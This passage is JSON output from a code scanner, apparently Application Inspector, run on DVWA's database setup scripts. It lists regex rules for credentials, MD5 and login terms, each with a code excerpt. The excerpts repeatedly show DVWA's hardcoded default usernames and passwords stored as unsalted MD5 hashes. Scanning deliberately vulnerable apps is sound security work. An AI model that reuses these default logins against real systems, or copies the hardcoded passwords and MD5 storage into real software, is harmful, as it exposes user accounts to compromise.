          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\ndvwaMessagePush( &quot;&#39;users&#39; table was created.&quot; );\n\n// Get the base directory for the avatar media...\n$baseUrl = &#39;http://&#39;.$_SERVER[ &#39;SERVER_NAME&#39; ].$_SERVER[ &#39;PHP_SELF&#39; ];\n$stripPos = strpos( $baseUrl, &#39;dvwa/setup.php&#39; );\n$baseUrl = substr( $baseUrl, 0, $stripPos ).&#39;dvwa/hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n",
        "startLocationLine": 55,
        "startLocationColumn": 35,
        "endLocationLine": 55,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "\tdvwaPageReload();\n}\n\n$create_tb = &quot;CREATE TABLE users (user_id integer UNIQUE, first_name text, last_name text, username text, password text, avatar text, PRIMARY KEY (user_id));&quot;;\n\nif( !pg_query( $create_tb ) ) {\n\tdvwaMessagePush( &quot;Table could not be created&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n}\n",
        "startLocationLine": 46,
        "startLocationColumn": 92,
        "endLocationLine": 46,
        "endLocationColumn": 100
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "*/\n\n// Connect to server\nif( !@pg_connect(&quot;host={$_DVWA[ &#39;db_server&#39; ]} port={$_DVWA[ &#39;db_port&#39; ]} user={$_DVWA[ &#39;db_user&#39; ]} password={$_DVWA[ &#39;db_password&#39; ]}&quot;) ) {\n\tdvwaMessagePush( &quot;Could not connect to the database.&lt;br/&gt;Please check the config file.&quot; );\n\tdvwaPageReload();\n}\n\n// Create database\n",
        "startLocationLine": 10,
        "startLocationColumn": 102,
        "endLocationLine": 10,
        "endLocationColumn": 110
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\n\n// Connect to server AND connect to the database\n$dbconn = @pg_connect(&quot;host={$_DVWA[ &#39;db_server&#39; ]} port={$_DVWA[ &#39;db_port&#39; ]} dbname={$_DVWA[ &#39;db_database&#39; ]} user={$_DVWA[ &#39;db_user&#39; ]} password={$_DVWA[ &#39;db_password&#39; ]}&quot;);\n\n\n// Create table &#39;users&#39;\n\n$drop_table = &quot;DROP TABLE IF EXISTS users;&quot;;\n",
        "startLocationLine": 34,
        "startLocationColumn": 140,
        "endLocationLine": 34,
        "endLocationColumn": 148
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\tdvwaPageReload();\n}\n\n$create_tb = &quot;CREATE TABLE users (user_id integer UNIQUE, first_name text, last_name text, username text, password text, avatar text, PRIMARY KEY (user_id));&quot;;\n\nif( !pg_query( $create_tb ) ) {\n\tdvwaMessagePush( &quot;Table could not be created&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n}\n",
        "startLocationLine": 46,
        "startLocationColumn": 107,
        "endLocationLine": 46,
        "endLocationColumn": 115
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "$baseUrl = substr( $baseUrl, 0, $stripPos ).&#39;dvwa/hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}admin.jpg&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n",
        "startLocationLine": 61,
        "startLocationColumn": 36,
        "endLocationLine": 61,
        "endLocationColumn": 44
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n}\n\n",
        "startLocationLine": 65,
        "startLocationColumn": 35,
        "endLocationLine": 65,
        "endLocationColumn": 43
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "$baseUrl = substr( $baseUrl, 0, $stripPos ).&#39;dvwa/hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}admin.jpg&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n",
        "startLocationLine": 61,
        "startLocationColumn": 31,
        "endLocationLine": 61,
        "endLocationColumn": 34
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}admin.jpg&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . pg_last_error() );\n",
        "startLocationLine": 62,
        "startLocationColumn": 34,
        "endLocationLine": 62,
        "endLocationColumn": 37
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}admin.jpg&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n",
        "startLocationLine": 63,
        "startLocationColumn": 26,
        "endLocationLine": 63,
        "endLocationColumn": 29
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}admin.jpg&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n}\n",
        "startLocationLine": 64,
        "startLocationColumn": 33,
        "endLocationLine": 64,
        "endLocationColumn": 36
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n}\n\n",
        "startLocationLine": 65,
        "startLocationColumn": 30,
        "endLocationLine": 65,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\n// Insert some data into users\n$base_dir= str_replace (&quot;setup.php&quot;, &quot;&quot;, $_SERVER[&#39;SCRIPT_NAME&#39;]);\n$avatarUrl  = $base_dir . &#39;hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n",
        "startLocationLine": 53,
        "startLocationColumn": 28,
        "endLocationLine": 53,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "Hack",
        "excerpt": "$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n",
        "startLocationLine": 58,
        "startLocationColumn": 8,
        "endLocationLine": 58,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "dvwaMessagePush( &quot;&lt;em&gt;Setup successful&lt;/em&gt;!&quot; );\n\nif( !dvwaIsLoggedIn())\n\tdvwaMessagePush( &quot;Please &lt;a href=&#39;login.php&#39;&gt;login&lt;/a&gt;.&lt;script&gt;setTimeout(function(){window.location.href=&#39;login.php&#39;},5000);&lt;/script&gt;&quot; );\ndvwaPageReload();\n\n?&gt;\n\n",
        "startLocationLine": 102,
        "startLocationColumn": 36,
        "endLocationLine": 102,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "dvwaMessagePush( &quot;&lt;em&gt;Setup successful&lt;/em&gt;!&quot; );\n\nif( !dvwaIsLoggedIn())\n\tdvwaMessagePush( &quot;Please &lt;a href=&#39;login.php&#39;&gt;login&lt;/a&gt;.&lt;script&gt;setTimeout(function(){window.location.href=&#39;login.php&#39;},5000);&lt;/script&gt;&quot; );\ndvwaPageReload();\n\n?&gt;\n\n",
        "startLocationLine": 102,
        "startLocationColumn": 47,
        "endLocationLine": 102,
        "endLocationColumn": 52
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "dvwaMessagePush( &quot;&lt;em&gt;Setup successful&lt;/em&gt;!&quot; );\n\nif( !dvwaIsLoggedIn())\n\tdvwaMessagePush( &quot;Please &lt;a href=&#39;login.php&#39;&gt;login&lt;/a&gt;.&lt;script&gt;setTimeout(function(){window.location.href=&#39;login.php&#39;},5000);&lt;/script&gt;&quot; );\ndvwaPageReload();\n\n?&gt;\n\n",
        "startLocationLine": 102,
        "startLocationColumn": 109,
        "endLocationLine": 102,
        "endLocationColumn": 114
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\tdvwaPageReload();\n}\n\n$create_tb = &quot;CREATE TABLE users (user_id int(6),first_name varchar(15),last_name varchar(15), user varchar(15), password varchar(32),avatar varchar(70), last_login TIMESTAMP, failed_login INT(3), PRIMARY KEY (user_id));&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $create_tb ) ) {\n\tdvwaMessagePush( &quot;Table could not be created&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n}\ndvwaMessagePush( &quot;&#39;users&#39; table was created.&quot; );\n",
        "startLocationLine": 43,
        "startLocationColumn": 114,
        "endLocationLine": 43,
        "endLocationColumn": 122
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "$avatarUrl  = $base_dir . &#39;hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n",
        "startLocationLine": 56,
        "startLocationColumn": 36,
        "endLocationLine": 56,
        "endLocationColumn": 44
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n}\ndvwaMessagePush( &quot;Data inserted into &#39;users&#39; table.&quot; );\n",
        "startLocationLine": 60,
        "startLocationColumn": 35,
        "endLocationLine": 60,
        "endLocationColumn": 43
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
